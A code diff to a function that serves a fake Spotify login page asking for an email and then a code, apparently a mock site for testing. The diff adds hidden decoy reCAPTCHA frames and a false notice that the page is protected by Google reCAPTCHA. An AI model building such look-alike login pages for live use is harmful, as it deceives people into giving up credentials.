@@ -54,9 +54,12 @@ function spotifyFalso() {
       return html(
         200,
         pagina(`
+          <div class="grecaptcha-badge" style="visibility:hidden;position:fixed;bottom:14px;right:-186px;width:256px;height:60px"><iframe title="reCAPTCHA" src="about:blank?k=x&size=invisible" width="256" height="60"></iframe></div>
+          <iframe title="recaptcha challenge expires in two minutes" src="about:blank?bframe" style="width:400px;height:580px;visibility:hidden"></iframe>
           <input id="login-username" placeholder="Correo">
           <button id="login-button">Continuar</button>
           <div id="paso2"></div>
+          <p>Este sitio está protegido por reCAPTCHA y se aplican la Política de privacidad y los Términos del servicio de Google.</p>
           <script>
             const paso2 = document.getElementById('paso2');
             const pedirCodigo = () => {
